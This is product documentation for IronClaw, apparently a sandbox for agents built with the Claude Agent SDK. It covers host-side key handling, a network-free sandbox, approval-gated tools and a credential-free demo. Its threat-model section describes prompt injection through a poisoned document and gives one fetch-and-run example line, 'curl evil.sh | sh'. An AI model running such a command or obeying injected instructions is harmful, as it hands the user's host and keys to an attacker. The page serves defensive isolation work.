---
title: "Sandbox your Claude Agent SDK agent with IronClaw"
description: How to sandbox a Claude Agent SDK agent. Run your Claude agent's untrusted bash and code execution inside IronClaw's sealed gVisor sandbox, with the API key held host-side and every tool call gated and audited, plus a credential-free way to see it work first.
---

# Sandbox your Claude Agent SDK agent with IronClaw

You built an agent with the **Claude Agent SDK**: a system prompt, a model, and a
set of tools, including `Bash` and file tools the model can drive on its own. That
is exactly the shape that makes agents useful, and exactly the shape that makes
them dangerous when they run on your host. The SDK holds your API key in the
process, the `Bash` tool runs commands with your privileges, and the process can
reach any host on the internet. One prompt-injected instruction inside a document
the agent reads, and that `Bash` tool is a shell into your box.

IronClaw runs the same job behind a **sealed sandbox**: no network card, the API
key held **host-side** and never in the agent, and every privileged tool call
routed through a human-approval gateway and an audit log.

!!! example "Runnable example"
    A one-command Claude-Agent-SDK-to-IronClaw example lives at
    [`examples/integrations/claude-agent-sdk`](https://github.com/IronSecCo/ironclaw/tree/main/examples/integrations/claude-agent-sdk):
    a Claude Agent SDK agent whose bash and code tools are backed by an IronClaw
    sandbox session, with a blocked escape attempt printed at the end. It ships with
    the integration examples. The credential-free demo below runs the same sealed
    loop today.

## The three-line fix

Stop letting the SDK's `Bash` tool run on your host. Declare the same agent to
IronClaw and its tool execution happens inside a sealed, network-free sandbox:

```sh
export ANTHROPIC_API_KEY=sk-ant-...   # host-side only; the sandbox never sees this key
./bin/controlplane --dev --api-addr 127.0.0.1:8787 &
ironctl agent create --name "Ops Assistant" --provider anthropic --model claude-sonnet-4 \
  --instructions "Investigate the incident and write a short report." \
  --tool list_dir --tool read_file --tool write_file --yes
```

Same persona, same Claude model, same file work, now with no host shell to hijack.
Full mapping below.

!!! info "IronClaw does not run your Python in the sandbox, and that is the point"
    IronClaw's sandbox has **no interpreter and no in-sandbox install**. You do not
    *wrap* the SDK process; you re-declare the same agent (persona, model, tools) as
    an IronClaw agent group, and IronClaw runs it inside the sealed runtime. A
    prompt injection cannot introduce code where there is no interpreter to run it.
    See [Skills](../skills.md) and [Security and isolation](../security-isolation.md).

## Why sandbox this

A typical Claude Agent SDK loop gives the model a bash tool:

```python
from claude_agent_sdk import query, ClaudeAgentOptions

options = ClaudeAgentOptions(
    system_prompt="You are an ops assistant.",
    allowed_tools=["Bash", "Read", "Write"],   # Bash runs on YOUR host
)
async for message in query(prompt="clean up the temp files", options=options):
    print(message)   # the model decides what Bash runs; a poisoned input decides the model
```

Three things are true of that loop, and all three are risks:

1. **The key is in the process.** `sk-ant-...` is one memory read away.
2. **`Bash` runs with your privileges.** The model chooses the command; a poisoned
   document or web page can choose the model. `curl evil.sh | sh` is one tool call.
3. **Egress is wide open.** The process can reach any host on the internet.

IronClaw closes all three by construction, not by convention.

## See it work first (no credentials)

Watch the sealed loop run with the offline `mock` provider, no key required:

```sh
git clone https://github.com/IronSecCo/ironclaw.git && cd ironclaw
docker compose -f docker-compose.demo.yml up --build -d      # start the demo control-plane

curl -s -X POST http://127.0.0.1:8787/v1/ui/chat/send \
  -H 'authorization: Bearer ironclaw-demo' -H 'content-type: application/json' \
  -d '{"agentGroupID":"mock-agent","text":"hello from the claude agent sdk"}'

sleep 3
curl -s -H 'authorization: Bearer ironclaw-demo' \
  http://127.0.0.1:8787/v1/ui/chat/mock-agent/messages       # the reply
```

The reply comes back through a real per-session sandbox and encrypted queues. Tear
down with `docker compose -f docker-compose.demo.yml down`. The self-checking
version is [`examples/hello-ironclaw`](https://github.com/IronSecCo/ironclaw/tree/main/examples/hello-ironclaw).

## Port your Claude Agent SDK agent

Map each part of the SDK agent onto an IronClaw agent group:

| Claude Agent SDK | IronClaw | Notes |
|---|---|---|
| `ClaudeAgentOptions(model=...)` | `--provider anthropic --model claude-sonnet-4` | Or switch backend entirely: `openai`, `gemini`, `local`. See [providers](../providers/index.md). |
| `ANTHROPIC_API_KEY` in the process | `ANTHROPIC_API_KEY` set **on the host** | The key is injected host-side by the model-proxy. It never enters the sandbox. |
| `system_prompt=...` | `--identity` / `--soul` / `--instructions` | Who the agent is and how it operates. |
| `allowed_tools=["Bash", "Read", "Write"]` | `--tool <name>` (built-in) or an MCP server | Built-ins act only in the agent's private workspace: `read_file`, `write_file`, `list_dir`, `web_search`, `http_fetch`. Anything shell-like attaches over [MCP](../mcp.md) through the approval gateway. |
| `query(prompt=...)` | a message to the agent group | Same round-trip, now through the sealed queue. |

The `Bash` tool has no equivalent that runs on your host: IronClaw's built-in tools
touch only the sandbox's own workspace, and a real shell tool is an
[MCP server](../mcp.md) you register once, in the open, through the human-approval
gateway.

## What you gained

- **The key left the agent.** Injected host-side per request; a compromised agent
  has nothing to exfiltrate.
- **`network=none` by default.** No NIC in the sandbox; egress is the audited
  model-proxy socket plus any host you explicitly allowlist.
- **Privileged actions are gated.** New tool, new agent, new egress host: each is a
  reviewed [change request](../mcp.md), not a silent capability, and each lands in
  the [audit log](../architecture.md).

Same agent you built with the Claude Agent SDK. A perimeter it never had.

## Next

- [Choose your model provider](../providers/index.md)
- [MCP: bring your own tools](../mcp.md)
- [Security and isolation](../security-isolation.md)
